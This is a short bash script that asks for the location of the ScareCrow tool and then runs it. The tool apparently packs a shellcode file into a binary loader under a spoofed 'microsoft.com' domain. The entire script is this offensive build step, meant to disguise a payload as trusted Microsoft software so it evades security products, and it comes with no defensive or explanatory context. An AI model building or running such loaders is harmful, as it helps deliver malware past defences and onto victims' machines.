#!/bin/bash

echo "[ ? ] Enter the location where ScareCrow is Located ? : "
#Read path
#cd $path
#cd /usr/tools/ScareCrow

# Start the build
./ScareCrow -Loader binary -console -domain microsoft.com -I shellcode.bin
